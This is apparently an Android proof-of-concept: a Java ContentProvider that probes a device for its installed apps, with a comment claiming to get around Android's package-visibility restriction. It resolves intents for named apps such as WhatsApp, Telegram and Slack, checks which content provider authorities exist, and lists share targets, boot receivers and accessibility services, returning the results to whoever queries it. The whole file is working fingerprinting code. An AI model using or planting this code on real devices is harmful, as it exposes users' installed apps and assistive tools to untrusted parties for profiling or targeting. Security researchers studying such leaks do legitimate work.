package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.List;

public class PackageOracleProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("intent")) {
            probeViaIntentResolution(cursor);
        } else if (path != null && path.contains("provider")) {
            probeViaProviderAuthority(cursor);
        } else if (path != null && path.contains("share")) {
            probeViaShareIntent(cursor);
        } else {
            probeViaIntentResolution(cursor);
            probeViaProviderAuthority(cursor);
            probeViaShareIntent(cursor);
        }

        return cursor;
    }

    private void probeViaIntentResolution(MatrixCursor cursor) {
        PackageManager pm = getContext().getPackageManager();

        // Query for specific intent actions that only certain apps handle
        // This bypasses QUERY_ALL_PACKAGES because intent resolution still works
        // for declared <queries> and for implicit intents matching the caller's manifest

        // Custom actions that specific apps register
        String[][] intentsToTest = {
            {"android.intent.action.VIEW", "https://www.google.com", "web_browser"},
            {"android.intent.action.VIEW", "geo:0,0", "maps"},
            {"android.intent.action.VIEW", "market://details?id=com.test", "play_store"},
            {"android.intent.action.VIEW", "mailto:test@test.com", "email"},
            {"android.intent.action.VIEW", "sms:123", "sms"},
            {"android.intent.action.VIEW", "tel:123", "phone"},
            {"android.intent.action.VIEW", "content://contacts/people", "contacts"},
            {"android.media.action.IMAGE_CAPTURE", null, "camera"},
            {"android.intent.action.VIEW", "vnd.youtube:abc", "youtube"},
            {"android.intent.action.VIEW", "spotify:track:abc", "spotify"},
            {"android.intent.action.VIEW", "whatsapp://send?text=hi", "whatsapp"},
            {"android.intent.action.VIEW", "instagram://user?username=test", "instagram"},
            {"android.intent.action.VIEW", "fb://page/123", "facebook"},
            {"android.intent.action.VIEW", "slack://channel?team=T&id=C", "slack"},
            {"android.intent.action.VIEW", "tg://msg?text=hi", "telegram"},
        };

        for (String[] test : intentsToTest) {
            Intent intent = new Intent(test[0]);
            if (test[1] != null) {
                intent.setData(Uri.parse(test[1]));
            }
            List<ResolveInfo> resolvers = pm.queryIntentActivities(intent, 0);
            if (resolvers != null && !resolvers.isEmpty()) {
                StringBuilder sb = new StringBuilder("count=" + resolvers.size() + " [");
                for (int i = 0; i < Math.min(resolvers.size(), 5); i++) {
                    ResolveInfo ri = resolvers.get(i);
                    sb.append(ri.activityInfo.packageName).append(",");
                }
                sb.append("]");
                cursor.addRow(new Object[]{"intent_" + test[2], sb.toString()});
            } else {
                cursor.addRow(new Object[]{"intent_" + test[2], "NONE"});
            }
        }

        // Query for broadcast receivers - reveals installed apps
        Intent boot = new Intent("android.intent.action.BOOT_COMPLETED");
        List<ResolveInfo> bootReceivers = pm.queryBroadcastReceivers(boot, 0);
        cursor.addRow(new Object[]{"boot_receivers", "count=" + (bootReceivers != null ? bootReceivers.size() : 0)});
        if (bootReceivers != null) {
            for (int i = 0; i < Math.min(bootReceivers.size(), 10); i++) {
                cursor.addRow(new Object[]{"boot_" + i, bootReceivers.get(i).activityInfo.packageName});
            }
        }

        // Query services
        Intent accessibility = new Intent("android.accessibilityservice.AccessibilityService");
        List<ResolveInfo> accServices = pm.queryIntentServices(accessibility, 0);
        cursor.addRow(new Object[]{"accessibility_svcs", "count=" + (accServices != null ? accServices.size() : 0)});
        if (accServices != null) {
            for (int i = 0; i < Math.min(accServices.size(), 10); i++) {
                cursor.addRow(new Object[]{"acc_" + i, accServices.get(i).serviceInfo.packageName + "/" + accServices.get(i).serviceInfo.name});
            }
        }
    }

    private void probeViaProviderAuthority(MatrixCursor cursor) {
        // Try to resolve content provider authorities - reveals installed apps
        String[] authorities = {
            "com.google.android.gms.phenotype",  // GMS
            "com.google.android.gsf.gservices",  // Google Services Framework
            "com.android.chrome.browser",         // Chrome
            "com.whatsapp.provider.media",        // WhatsApp
            "com.instagram.contentprovider",      // Instagram
            "com.facebook.katana.provider.PlatformProvider", // Facebook
            "downloads",                          // Downloads
            "media",                              // Media
            "telephony",                          // Telephony
            "com.google.android.apps.photos.contentprovider", // Photos
            "com.android.contacts",               // Contacts
        };

        android.content.ContentResolver cr = getContext().getContentResolver();
        for (String auth : authorities) {
            try {
                // acquireUnstableContentProviderClient will return null if provider doesn't exist
                android.content.ContentProviderClient client =
                    cr.acquireUnstableContentProviderClient(auth);
                if (client != null) {
                    cursor.addRow(new Object[]{"cp_" + auth.substring(auth.lastIndexOf('.')+1), "EXISTS"});
                    client.close();
                } else {
                    cursor.addRow(new Object[]{"cp_" + auth.substring(auth.lastIndexOf('.')+1), "NOT_FOUND"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cp_" + auth.substring(auth.lastIndexOf('.')+1), "ERR:" + e.getClass().getSimpleName()});
            }
        }
    }

    private void probeViaShareIntent(MatrixCursor cursor) {
        // SEND intent - which apps can receive shared content?
        PackageManager pm = getContext().getPackageManager();

        Intent share = new Intent(Intent.ACTION_SEND);
        share.setType("text/plain");
        share.putExtra(Intent.EXTRA_TEXT, "test");
        List<ResolveInfo> targets = pm.queryIntentActivities(share, 0);
        cursor.addRow(new Object[]{"share_targets", "count=" + (targets != null ? targets.size() : 0)});
        if (targets != null) {
            for (int i = 0; i < Math.min(targets.size(), 15); i++) {
                cursor.addRow(new Object[]{"share_" + i, targets.get(i).activityInfo.packageName + "/" + targets.get(i).activityInfo.name});
            }
        }

        // IMAGE share targets
        Intent imgShare = new Intent(Intent.ACTION_SEND);
        imgShare.setType("image/*");
        List<ResolveInfo> imgTargets = pm.queryIntentActivities(imgShare, 0);
        cursor.addRow(new Object[]{"img_share_targets", "count=" + (imgTargets != null ? imgTargets.size() : 0)});
        if (imgTargets != null) {
            for (int i = 0; i < Math.min(imgTargets.size(), 10); i++) {
                cursor.addRow(new Object[]{"img_share_" + i, imgTargets.get(i).activityInfo.packageName});
            }
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
